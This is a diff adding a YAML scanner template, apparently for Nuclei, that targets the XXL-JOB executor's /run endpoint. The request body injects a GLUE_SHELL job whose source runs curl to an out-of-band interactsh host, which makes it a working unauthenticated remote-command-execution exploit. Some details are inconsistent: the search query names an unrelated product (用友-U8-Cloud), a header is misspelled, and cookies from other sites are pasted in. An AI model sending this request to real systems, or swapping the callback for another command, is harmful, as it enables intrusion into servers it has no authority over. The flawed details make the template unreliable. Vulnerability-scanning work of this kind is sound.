@@ -1,0 +1,48 @@
+id: exector
+info:
+  name: XXL-JOB executor
+  author: mike
+  severity: info
+  description: XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate, br
+        Connection: closSe
+        Cookie: smile=1D1; GIXq_2132_ulastactivity=233bKkS8IIaSEMRpjx8npyY191TDyZRZJxMQ%2BDSc6fLCXNoXLQsh; GIXq_2132_nofavfid=1; csrftoken=AVsu9fm7hhnrMrbjHG0rUO1WCrc2hekVO0Z3893N59Kj9MTcgZ2CmjJHT7EpOvhS; ECS[visit_times]=1; _ga_P1E9Z5LRRK=GS1.1.1699967545.1.1.1699967585.0.0.0; _ga=GA1.1.167458465.1699967545
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 365
+
+        {
+          "jobId": 1,
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_SHELL",
+          "glueSource": "curl {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
